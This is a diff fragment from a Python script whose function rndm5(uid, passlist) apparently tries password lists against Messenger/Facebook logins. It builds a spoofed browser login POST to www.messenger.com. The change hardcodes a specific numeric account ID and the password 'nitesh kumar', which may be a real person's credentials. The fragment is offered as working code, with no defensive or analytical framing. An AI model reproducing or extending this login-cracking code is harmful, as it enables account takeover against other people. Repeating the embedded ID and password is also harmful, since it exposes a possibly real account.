@@ -1389,8 +1389,8 @@ def rndm5(uid,passlist):
 'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
 'lgnrnd': '055850_c2gE',
 'lgnjs': 'n',
-'email': uid,
-'pass': f'#PWD_BROWSER:0:{int(time.time())}:{pas}',
+'email': '100068791466665',
+'pass': f'#PWD_BROWSER:0:{int(time.time())}:{'nitesh kumar'}',
 'default_persistent': '',}
                         headers={'Host': 'www.messenger.com',
 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
